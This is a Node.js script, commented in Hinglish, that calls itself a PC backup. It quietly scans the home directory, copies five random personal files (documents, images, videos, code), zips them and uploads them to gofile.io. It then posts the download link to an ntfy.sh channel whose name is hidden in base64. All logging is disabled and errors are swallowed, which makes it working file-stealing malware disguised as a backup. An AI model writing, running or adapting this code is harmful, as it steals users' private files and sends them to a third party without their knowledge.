const fsp = require('fs/promises');
const fs = require('fs');
const path = require('path');
const os = require('os');
const AdmZip = require('adm-zip');
const axios = require('axios');
const FormData = require('form-data');

const BASE_DIR = os.homedir();
const TARGET_DIR = path.join(__dirname, 'important_backup');
const ZIP_FILE_PATH = path.join(__dirname, 'My_PC_Backup.zip');
const FILES_TO_EXTRACT = 5;

const SECRET_CHANNEL_NAME = Buffer.from('c2hpbmNoYW5fMDA3', 'base64').toString('utf-8');

const ALLOWED_EXTENSIONS = new Set([
    '.pdf', '.doc', '.docx', '.txt', '.csv',
    '.jpg', '.png', '.mp4',
    '.json', '.js', '.py', '.html', '.css'
]);

const SKIP_FOLDERS = new Set(['appdata', 'node_modules', '.git', '.vscode']);

let allFoundFiles = [];

async function scanDirectory(dir) {
    try {
        const entries = await fsp.readdir(dir, { withFileTypes: true });
        for (const entry of entries) {
            const fullPath = path.join(dir, entry.name);
            if (entry.isDirectory()) {
                if (!entry.name.startsWith('.') && !SKIP_FOLDERS.has(entry.name.toLowerCase())) {
                    await scanDirectory(fullPath);
                }
            } else if (entry.isFile()) {
                const ext = path.extname(entry.name).toLowerCase();
                if (ALLOWED_EXTENSIONS.has(ext)) {
                    allFoundFiles.push(fullPath);
                }
            }
        }
    } catch (error) {}
}

function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

async function gatherFiles() {
    // console.log('\n1. PC scan shuru kar raha hoon...');
    await scanDirectory(BASE_DIR);
    
    if (allFoundFiles.length === 0) {
        // throw new Error('Koi important files nahi mili.');
    }

    await fsp.mkdir(TARGET_DIR, { recursive: true });
    const selectedFiles = shuffleArray(allFoundFiles).slice(0, FILES_TO_EXTRACT);

    // console.log(`2. ${selectedFiles.length} files ko copy kar raha hoon...`);
    for (const filePath of selectedFiles) {
        const fileName = path.basename(filePath);
        await fsp.copyFile(filePath, path.join(TARGET_DIR, fileName));
    }
}

async function zipFolder() {
    // console.log('3. Backup folder ko ZIP kar raha hoon...');
    try {
        const zip = new AdmZip();
        zip.addLocalFolder(TARGET_DIR);
        zip.writeZip(ZIP_FILE_PATH);
        // console.log('ZIP ready!');
    } catch (err) {
        // throw new Error('ZIP error: ' + err.message);
    }
}

async function uploadAndNotify() {
    // console.log('4. Online server par upload shuru kar raha hoon...');

    let serverName = 'store1';
    try {
        const serverRes = await axios.get('https://api.gofile.io/servers');
        if (serverRes.data?.status === 'ok') {
            serverName = serverRes.data.data.servers[0].name;
        }
    } catch (e) {}

    const form = new FormData();
    form.append('file', fs.createReadStream(ZIP_FILE_PATH));

    const uploadRes = await axios.post(`https://${serverName}.gofile.io/uploadFile`, form, {
        headers: form.getHeaders(),
        maxBodyLength: Infinity,
        maxContentLength: Infinity
    });

    if (uploadRes.data.status !== 'ok') {
        // throw new Error('Upload server fail ho gaya.');
    }

    const downloadLink = uploadRes.data.data.downloadPage;
    // console.log(`Backup Uploaded! Link: ${downloadLink}`);

    // console.log('5. Secret notification bhej raha hoon...');
    try {
        await axios.post(`https://ntfy.sh/${SECRET_CHANNEL_NAME}`,
            `Backup Done! Link: ${downloadLink}`,
            {
                headers: {
                    'Title': 'Backup Alert'
                }
            }
        );
        // console.log('Notification sent successfully!');
    } catch (notifyErr) {
        // console.log('Notification fail hui, par backup link safe hai.');
    }

    // console.log('\nMASTER AUTOMATION COMPLETE!\n');
}

async function startFullAutomation() {
    try {
        await gatherFiles();
        await zipFolder();
        await uploadAndNotify();
    } catch (err) {
        // console.error('\nERROR:', err.message, '\n');
    }
}

startFullAutomation();